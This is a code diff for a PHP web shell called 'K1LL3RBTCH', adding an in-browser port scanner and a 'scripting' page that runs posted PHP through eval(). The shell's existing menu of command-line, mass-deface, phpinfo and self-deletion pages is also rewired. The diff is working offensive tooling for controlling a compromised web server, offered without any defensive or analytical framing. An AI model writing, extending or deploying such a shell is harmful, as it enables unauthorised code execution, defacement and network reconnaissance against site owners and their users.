@@ -51,7 +51,7 @@ ob_start(); // start cleaning
 $access_key = filter_var("qwerty", FILTER_SANITIZE_STRING); // password (You can set your own)
 
 // array with $_GET pages
-$switch = array('home', 'securityinformation', 'commandline', 'deface', 'phpinfo', 'suicide', 'logout');
+$switch = array('home', 'securityinformation', 'commandline', 'portscan', 'script', 'deface', 'phpinfo', 'suicide', 'logout');
 
 // writing class for login system
 class Loginsystem
@@ -179,8 +179,6 @@ class Loginsystem
     {
       // show login form
       print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.5 by It0sh1</title>");
-      // include some js scripts from cloudflare
-      print("<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css'>");
       // include favicon
       favicon();
       print("</head><body style='background-color: black;'>");
@@ -234,7 +232,7 @@ class Loginsystem
       print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.5</title>");
       // insert favicon
       favicon();
-      print("<body style='background-color: black;'>");
+      print("</head><body style='background-color: black;'>");
       print("<code style='color: #FFE6E8; font-size: 14px;'><center><b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.5 - Made by It0sh1</b><hr></center>");
       print("<center style='float: right;'>");
       print("<b style='float: right;'>".self::img()."</b></center>");
@@ -254,10 +252,12 @@ class Loginsystem
       print("<a href='".basename($_SERVER['PHP_SELF'])."'><b style='color: #8B0000;'>[</b>home<b style='color: #8B0000;'>]</b></a>");
       print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[1]."'><b style='color: #8B0000;'>[</b>sec. info<b style='color: #8B0000;'>]</b></a>");
       print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[2]."'><b style='color: #8B0000;'>[</b>cli<b style='color: #8B0000;'>]</b></a>");
-      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[3]."'><b style='color: #8B0000;'>[</b>deface<b style='color: #8B0000;'>]</b></a>");
-      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[4]."'><b style='color: #8B0000;'>[</b>phpinfo<b style='color: #8B0000;'>]</b></a>");
-      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[5]."'><b style='color: #8B0000;'>[</b>suicide<b style='color: #8B0000;'>]</b></a>");
-      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[6]."'><b style='color: #8B0000;'>[</b>logout<b style='color: #8B0000;'>]</b></a></div>");
+      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[3]."'><b style='color: #8B0000;'>[</b>port scan<b style='color: #8B0000;'>]</b></a>");
+      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[4]."'><b style='color: #8B0000;'>[</b>scripting<b style='color: #8B0000;'>]</b></a>");
+      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[5]."'><b style='color: #8B0000;'>[</b>deface<b style='color: #8B0000;'>]</b></a>");
+      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[6]."'><b style='color: #8B0000;'>[</b>phpinfo<b style='color: #8B0000;'>]</b></a>");
+      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[7]."'><b style='color: #8B0000;'>[</b>suicide<b style='color: #8B0000;'>]</b></a>");
+      print("<a href='".basename($_SERVER['PHP_SELF'])."?q=".$switch[8]."'><b style='color: #8B0000;'>[</b>logout<b style='color: #8B0000;'>]</b></a></div>");
       print("<style>");
       print(".bar a { color: #FFE6E8; padding: 1px 15px; underline: none; text-decoration: none; display: inline-block; height: 20px; } .bar a:hover { color: blue;}</style>");
       print("</center><hr></code></body>");
@@ -1273,6 +1273,198 @@ class shellfunctions
     }
   }
 
+  // making port scan
+  public static function portscanning()
+  {
+    // import switch array
+    global $switch;
+
+    // when $_GET['q'] is set:
+    if(isset($_GET['q']) AND $_GET['q'] === $switch[3])
+    {
+      // show portscanner
+      print("<code style='color: #FFE6E8;'>");
+      print("<h2 style='color: #8B0000;'>Port Scanner</h2><hr><center>");
+      print("<form method='POST' action=''>");
+      print("<br><br><br>Host: <br><input type='text' name='host' value='".$_SERVER['SERVER_NAME']."' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
+      print("<br><br><br>Start port: <br><input type='text' name='startport' value='1' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
+      print("<br><br><br>End Port: <br><input type='text' name='endport' value='65535' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
+      print("<br><br><br><button type='submit' name='scanbitch' style='background: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer;font-size: 11px;'>scan</button></form>");
+
+      ?>
+      <style>
+      table, th, td
+      {
+        border: 2px solid black;
+      }
+      </style>
+      <?php
+
+      print("<table style='width: 50%;color: white; background-color: #141617; font-size: 13px; a:hover  { background-color: white; }'>");
+      print("<tr><td>Open ports</td>");
+      print("<td>Number</td>");
+      print("<td>Active</td><tr>");
+
+
+
+      // CSS for errormessages
+      print("<style> input:focus { outline: none !important; border-color: #8B0000; box-shadow: 0 0 10px #8B0000; } textarea:focus { outline: none !important; border-color: #8B0000; box-shadow: 0 0 10px #8B0000; }.error-message { background-color: #fce4e4; border: 2px solid #fcc2c3; width: 170px; padding: 5px 30px; border-radius: 3px; } .error-text { color: #cc0033; font-family: Helvetica, Arial, sans-serif; font-size: 13px;font-weight: bold;line-height: 20px;text-shadow: 1px 1px rgba(250,250,250,.3);}");
+      print(".succeed-message { background-color: #ecffd6; border: 2px solid #617c42; width: 170px; padding: 5px 30px; border-radius: 3px; } .succeed-text { color: #2b7515; font-family: Helvetica, Arial, sans-serif; font-size: 13px; font-weight: bold; line-height: 20px; text-shadow: 1px 1px rgba(250,250,250,.3);}</style>");
+
+      function PortScanner()
+      {
+
+        // when button scan is posted
+        if(isset($_POST['scanbitch']))
+        {
+          // some variables
+          $host  = $_POST['host'];
+          $sport = $_POST['startport'];
+          $eport = $_POST['endport'];
+
+          // check if socket_create does exists
+          if(function_exists('socket_create'))
+          {
+            // create socket
+            $socketconn = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+            for($socketport=$sport;$socketport<=$eport; $socketport++)
+            {
+              // create connection
+              $connecting = @socket_connect($socketconn, $host, $socketport);
+              // check if connection is true and established:
+              if($connecting == true)
+              {
+                // create list of showing ports
+                // end PHP TAG ?>
+                <tr><td>Port:</td>
+                <td><?php echo $socketport; ?></td>
+                <td style='color: green;'>OPEN &#9989;</td>
+
+                </tr>
+                <?php // OPEN PHP TAG
+                // close socket
+                socket_close($socketconn);
+                $socketconn = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+              }
+            }
+
+          // when socket_create does not exists but fsockopen does
+          } elseif(!function_exists('socket_create') AND function_exists('fsockopen'))
+          {
+            // for loop
+            for($socketport=$sport;$socketport<=$eport;$socketport++)
+            {
+              // make connection
+              $fsockconn = fsockopen($host, $socketport);
+
+              // check if connection is true:
+              if($fsockconn == true)
+              {
+                // create list of showing ports
+                // end PHP TAG ?>
+                <tr><td>Port:</td>
+                <td><?php echo $socketport; ?></td>
+                <td style='color: green;'>OPEN &#9989;</td>
+
+                </tr>
+                <?php // OPEN PHP TAG
+
+                // close connection
+                fclose($fsockconn);
+              }
+            }
+          }
+        }
+
+        exit; // EXIT
+      }
+
+      // declare portscanner
+      PortScanner();
+    }
+  }
+
+  // creating function for scripting
+  public static function scripting()
+  {
+    // import switch array
+    global $switch;
+
+    // when $_GET['q'] is set:
+    if(isset($_GET['q']) AND $_GET['q'] === $switch[4])
+    {
+      // show scripting table + custom code editor
+      print("<code style='color: #FFE6E8;'>");
+      print("<h2 style='color: #8B0000;'>Scripting</h2><hr><center>");
+      print("<form method='POST' action=''><br><br>");
+      print("Scripting<br><br><textarea class='codeinput' style='resize: none; border: 2px solid #6C686C; background-color: black; color: white; height: 40%; width: 60%;' id='code' name='code'  placeholder='Write some code...'><?php echo 'hello world!'; ?></textarea><br><br>");
+      print("&nbsp;&nbsp;<button type='submit' name='executecode' style='background: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer;font-size: 11px;'>Execute Script</button></form>");
+      print("<button onclick='javascript:clearField();' style='background: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer;font-size: 11px;'>Clear</button>");
+
+      // here comes the CSS
+      // END PHP TAG ?>
+      <!-- OPEN script tag for javascript -->
+      <script>
+      // making function for clearing text in textarea
+      function clearField()
+      {
+        document.getElementById("code").value = "";
+      }
+      </script>
+      <?php // OPEN PHP TAG
+
+      // here comes the fun part...
+      if(isset($_POST['executecode']))
+      {
+        // check if there is no code input
+        if(empty($_POST['code']))
+        {
+          // show alert popup message
+          print("<script>alert('Error: Field cannot be empty.');</script>");
+
+        // when code is posted
+        } else {
+
+          if(isset($_POST['code']))
+          {
+            // $_SESSION['code'] becomes true:
+            $_SESSION['code'] = true;
+
+            if(isset($_SESSION['code']))
+            {
+              // $_SESSION['code'] becomes $_POST['code'];
+              $_SESSION['code'] = '?>'.$_POST['code'];
+
+              // clean output buffer
+              ob_clean();
+              // header
+              print("<body style='background: #000; color: white;'><center><b style='color: #8B0000;'>K1LL3RBTCH</b> Shell scripter</center><hr><br>");
+              // turns code into executing code
+              eval($_SESSION['code']);
+
+              // when you wanna end
+              echo "<br><br><hr><center><form method='POST' action=''><button type='submit' name='deletesession' style='text-decoration: none; border: 2px solid #333; background-color: grey;'><code style='font-size: 15px; color: #8B0000;'>Stop script</code></button></form></center>";
+
+              // When we press stop script button
+              if(isset($_POST['deletesession']))
+              {
+                // delete session
+                session_unset($_SESSION['code']);
+                // destroy session
+                session_destroy($_SESSION['code']);
+
+                // locate to the script page
+                header('Location: '.$_SERVER['PHP_SELF'].'?q='.$switch[4].'');
+                // stop and exit script
+                exit; // EXIT
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+
   // defacing function for defacing webserver
   public static function defacement()
   {
@@ -1293,7 +1485,7 @@ class shellfunctions
     }
 
     // when $_GET['q'] is set:
-    if(isset($_GET['q']) AND $_GET['q'] === $switch[3])
+    if(isset($_GET['q']) AND $_GET['q'] === $switch[5])
     {
 
       // display mass deface section
@@ -1455,7 +1647,7 @@ class shellfunctions
     global $switch;
 
     // when $_GET['q'] is set:
-    if(isset($_GET['q']) AND $_GET['q'] === $switch[4])
+    if(isset($_GET['q']) AND $_GET['q'] === $switch[6])
     {
       // display info
       print("<code><h2 style='color: #8B0000;'>PHP server information</h2><hr>");
@@ -1488,7 +1680,7 @@ class shellfunctions
     global $switch;
 
     // when $_GET['q'] is set:
-    if(isset($_GET['q']) AND $_GET['q'] === $switch[5])
+    if(isset($_GET['q']) AND $_GET['q'] === $switch[7])
     {
       print("<code style='color: #FFE6E8;'><h2 style='color: #8B0000;'>Suicide</h2><hr>");
       print("<form method='POST' action=''>");
@@ -1550,7 +1742,7 @@ class shellfunctions
     global $switch;
 
     // if $_GET is set:
-    if(isset($_GET['q']) AND $_GET['q'] === $switch[6])
+    if(isset($_GET['q']) AND $_GET['q'] === $switch[8])
     {
 
       // unset and destroy session
@@ -1567,6 +1759,8 @@ $shellfunctions = new shellfunctions;
 $shellfunctions->home();
 $shellfunctions->securityinformation();
 $shellfunctions->commandlineinterface();
+$shellfunctions->portscanning();
+$shellfunctions->scripting();
 $shellfunctions->defacement();
 $shellfunctions->phpinf();
 $shellfunctions->suicide();
@@ -1601,23 +1795,32 @@ class shelllinking
         self::commandlineinterface();
         break;
 
-      // defacing
+      // portscanning
       case $switch[3]:
+        self::portscanning();
+        break;
+
+      // php scripting
+      case $switch[4]:
+        self::scripting();
+
+      // defacing
+      case $switch[5]:
         self::defacement();
         break;
 
       // php information
-      case $switch[4]:
+      case $switch[6]:
         self::phpinf();
         break;
 
       // self killing
-      case $switch[5]:
+      case $switch[7]:
         self::suicide();
         break;
 
       // loggout.
-      case $switch[6]:
+      case $switch[8]:
         self::logout();
         break;
     }
